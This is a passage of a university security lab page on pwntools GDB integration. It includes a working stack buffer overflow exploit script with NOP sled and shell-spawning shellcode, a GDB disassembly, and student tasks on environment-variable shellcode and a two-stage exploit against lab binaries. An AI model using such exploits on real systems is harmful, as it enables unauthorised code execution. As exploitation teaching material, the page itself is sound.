+<h3 class="sectionedit10" id="gdb_integration">GDB integration</h3>
+<div class="level3">
+
+<p>
+Most importantly, <code>pwntools</code> provides GDB integration, which is extremely useful.
+</p>
+
+<p>
+Let&#039;s follow an example using the vulnerable binary from <a href="../../../../cns/labs/lab-06.html#phase_1recon" class="wikilink1" title="cns:labs:lab-06">lab 06</a>:
+</p>
+<pre class="code python"><span class="co1">#!/usr/bin/env python</span>
+<span class="kw1">from</span> pwn <span class="kw1">import</span> *
+&nbsp;
+ret_offset <span class="sy0">=</span> <span class="nu0">68</span>
+buf_addr <span class="sy0">=</span> <span class="nu0">0xffffcee8</span>
+ret_address <span class="sy0">=</span> buf_addr+ret_offset+<span class="nu0">16</span>
+payload <span class="sy0">=</span> <span class="st0">''</span>
+&nbsp;
+p <span class="sy0">=</span> process<span class="br0">&#40;</span><span class="st0">'vuln'</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Garbage</span>
+payload +<span class="sy0">=</span> ret_offset * <span class="st0">'A'</span>
+&nbsp;
+<span class="co1"># Overwrite ret_address, taking endianness into account</span>
+payload +<span class="sy0">=</span> p32<span class="br0">&#40;</span>ret_address<span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Add nopsled</span>
+nops <span class="sy0">=</span> <span class="st0">'<span class="es0">\x</span>90'</span>*<span class="nu0">100</span>
+&nbsp;
+<span class="co1"># Alternative: asm('nop'), but the above is simpler and faster</span>
+payload +<span class="sy0">=</span> nops
+&nbsp;
+<span class="co1"># Assemble a shellcode from 'shellcraft' and append to payload</span>
+shellcode <span class="sy0">=</span> asm<span class="br0">&#40;</span>shellcraft.<span class="me1">sh</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+payload +<span class="sy0">=</span> shellcode
+&nbsp;
+<span class="co1"># Attach to process</span>
+gdb.<span class="me1">attach</span><span class="br0">&#40;</span>p<span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Wait for breakpoints, commands etc.</span>
+<span class="kw2">raw_input</span><span class="br0">&#40;</span><span class="st0">&quot;Send payload?&quot;</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Send payload</span>
+p.<span class="me1">sendline</span><span class="br0">&#40;</span>payload<span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Enjoy shell :-)</span>
+p.<span class="me1">interactive</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+
+<p>
+Notice the <code>gdb.attach(p)</code> and <code>raw_input</code> lines. The former will open a new terminal window with GDB already attached. All of your GDB configurations will be used, so this works with PEDA as well. Let&#039;s set a breakpoint at the <code>ret</code> instruction from the <code>main</code> function:
+</p>
+<pre class="code asm">gdb<span class="sy1">-</span>peda<span class="sy2">$</span> pdis main
+Dump of assembler <span class="kw5">code</span> for function main<span class="sy1">:</span>
+   <span class="nu0">0x08048440</span> &lt;<span class="sy1">+</span><span class="nu0">0</span>&gt;<span class="sy1">:</span>	<span class="kw1">push</span>   <span class="kw4">ebp</span>
+   <span class="nu0">0x08048441</span> &lt;<span class="sy1">+</span><span class="nu0">1</span>&gt;<span class="sy1">:</span>	<span class="kw1">mov</span>    <span class="kw4">ebp</span><span class="sy1">,</span><span class="kw4">esp</span>
+   <span class="nu0">0x08048443</span> &lt;<span class="sy1">+</span><span class="nu0">3</span>&gt;<span class="sy1">:</span>	<span class="kw1">sub</span>    <span class="kw4">esp</span><span class="sy1">,</span><span class="nu0">0x40</span>
+   <span class="nu0">0x08048446</span> &lt;<span class="sy1">+</span><span class="nu0">6</span>&gt;<span class="sy1">:</span>	<span class="kw1">lea</span>    <span class="kw4">ebx</span><span class="sy1">,</span><span class="br0">&#91;</span><span class="kw4">ebp</span><span class="sy1">-</span><span class="nu0">0x40</span><span class="br0">&#93;</span>
+   <span class="nu0">0x08048449</span> &lt;<span class="sy1">+</span><span class="nu0">9</span>&gt;<span class="sy1">:</span>	<span class="kw1">push</span>   <span class="kw4">ebx</span>
+   <span class="nu0">0x0804844a</span> &lt;<span class="sy1">+</span><span class="nu0">10</span>&gt;<span class="sy1">:</span>	<span class="kw1">push</span>   <span class="nu0">0x804a020</span>
+   <span class="nu0">0x0804844f</span> &lt;<span class="sy1">+</span><span class="nu0">15</span>&gt;<span class="sy1">:</span>	<span class="kw1">call</span>   <span class="nu0">0x8048300</span> &lt;printf@plt&gt;
+   <span class="nu0">0x08048454</span> &lt;<span class="sy1">+</span><span class="nu0">20</span>&gt;<span class="sy1">:</span>	<span class="kw1">push</span>   <span class="kw4">ebx</span>
+   <span class="nu0">0x08048455</span> &lt;<span class="sy1">+</span><span class="nu0">21</span>&gt;<span class="sy1">:</span>	<span class="kw1">call</span>   <span class="nu0">0x8048310</span> &lt;gets@plt&gt;
+   <span class="nu0">0x0804845a</span> &lt;<span class="sy1">+</span><span class="nu0">26</span>&gt;<span class="sy1">:</span>	<span class="kw1">add</span>    <span class="kw4">esp</span><span class="sy1">,</span><span class="nu0">0x4</span>
+   <span class="nu0">0x0804845d</span> &lt;<span class="sy1">+</span><span class="nu0">29</span>&gt;<span class="sy1">:</span>	<span class="kw1">leave</span>  
+   <span class="nu0">0x0804845e</span> &lt;<span class="sy1">+</span><span class="nu0">30</span>&gt;<span class="sy1">:</span>	<span class="kw1">ret</span>    
+   <span class="nu0">0x0804845f</span> &lt;<span class="sy1">+</span><span class="nu0">31</span>&gt;<span class="sy1">:</span>	<span class="kw1">nop</span>
+End of assembler dump<span class="sy1">.</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> b <span class="sy1">*</span><span class="nu0">0x0804845e</span>
+Breakpoint <span class="nu0">1</span> <span class="kw5">at</span> <span class="nu0">0x804845e</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> c
+Continuing<span class="sy1">.</span></pre>
+
+<p>
+The <code>continue</code> command will return control to the terminal in which we&#039;re running the <code>pwntools</code> script. This is where the <code>raw_input</code> comes in handy, because it will wait for you to say “go” before proceeding further. Now if you hit <code>&lt;Enter&gt;</code> at the <code>Send payload?</code> prompt, you will notice that GDB has reached the breakpoint you&#039;ve previously set.
+</p>
+
+<p>
+You can now single-step each instruction of the shellcode inside GDB to see that everything is working properly. Once you reach <code>int 0x80</code>, you can <code>continue</code> again (or close GDB altogether) and interact with the newly spawned shell in the pwntools session.
+</p>
+
+</div>
+<!-- EDIT10 SECTION "GDB integration" [8315-10774] -->
+<h2 class="sectionedit11" id="tasks">Tasks</h2>
+<div class="level2">
+
+</div>
+<!-- EDIT11 SECTION "Tasks" [10775-10792] -->
+<h3 class="sectionedit12" id="passing_shellcode_through_the_environment_3p">1. Passing shellcode through the environment [3p]</h3>
+<div class="level3">
+
+<p>
+Navigate to the <code>1_env_var</code> directory. Run <code>make</code>.
+</p>
+
+<p>
+Analyse the <code>vuln.asm</code> source file. Notice that <code>strncpy</code> is used and that the buffer is not large enough to store our desired shellcode. In this task, you will use an environment variable, which as you may know will be present on the stack, to store our shellcode.
+</p>
+
+<p>
+Write a small script which prints an <code>execve(&#039;/bin/sh&#039;, [&#039;/bin/sh&#039;], 0)</code> shellcode preceded by a large (128k) NOP sled.
+Then, store this shellcode in an environment variable as follows:
+</p>
+<pre class="code shell">$ export A=$(./script.py)</pre>
+
+<p>
+Next, use the <code>getenv</code> binary to find the (approximate) address of the environment variable on the stack
+</p>
+<pre class="code shell">$ ./getenv A
+Env var addr 0xfffdd1e7</pre>
+
+<p>
+This is the address at which you will return to. Just to be sure that you overwrite the return address, write the env var address multiple times in the buffer (as much as <code>strncpy</code> allows it).
+</p>
+
+</div>
+<!-- EDIT12 SECTION "1. Passing shellcode through the environment [3p]" [10793-11779] -->
+<h3 class="sectionedit13" id="multistage_exploit_7p">2. Multistage exploit [7p]</h3>
+<div class="level3">
+
+<p>
+Navigate to <code>2_640k</code> and run <code>make</code>. Notice that what we&#039;re building is the asm file. The C source is there to show what the program is doing from a logical standpoint.
+</p>
+
+<p>
+Since the buffer is not large enough to hold a proper shellcode, we&#039;re going to construct a two-stage exploit using <code>pwntools</code>. You can start from the <code>skel.py</code> file, if you want.
+</p>
+
+</div>
+
+<h4 id="a_leak_the_buffer_address_2p">a. Leak the buffer address [2p]</h4>
+<div class="level4">
+
+<p>
+Understand the logic of the program. Can you leak the address of the overflowing buffer somehow? Can  you verify that your leak is correct?
+</p>
+
+</div>
+
+<h4 id="b_construct_the_first_stage_2p">b. Construct the first stage [2p]</h4>
+<div class="level4">
+
+<p>
+You can use the leak to return exactly to the start of your buffer in order to use all of our available 20 bytes. Use them to call <code>read(0, buf+return_offset, 200)</code>. Write a small shellcode which does this. Check using peda if the <code>read</code> is being called i.e. the program enters a blocked state in which it awaits input.
+</p>
+
+</div>
+
+<h4 id="c_construct_the_second_stage_3p">c. Construct the second stage [3p]</h4>
+<div class="level4">
+
+<p>
+Now that you are reading onto the stack further past the return address, you can write your proper shellcode there.
+</p>
+
+<p>
+<p><div class="noteimportant">
+Understand that you are currently executing code <strong>from the stack</strong>. If your code changes after inadvertently modifying values on the stack, you should look for another solution.
+
+</div></p>
+</p>
+
+<p>
+<p><div class="notetip">
+In order to get <code>/bin/sh</code> onto the stack, your shellcode should look something like this:
+</p>
+<pre class="code asm"><span class="kw1">jmp</span> &lt;offset&gt; <span class="co1">; determine through trial and error</span>
+<span class="st0">'/bin/sh'</span>\<span class="nu0">0</span>
+<span class="co1">; code continues here</span></pre>
+
+<p>
+This will effectively jump over the <code>/bin/sh</code> string on the stack, which you can then use for your shellcode. Without this initial <strong>jmp</strong> instruction, the string will be interpreted as instructions!
+</p>
+
+<p>
+You can also use the ”<code>call</code> before defining a string” trick from the last session to get <code>/bin/sh</code> onto the stack.
+
+</div></p>
+</p>
+
+</div>
+<!-- EDIT13 SECTION "2. Multistage exploit [7p]" [11780-] --></div>
+</body>
+</html>
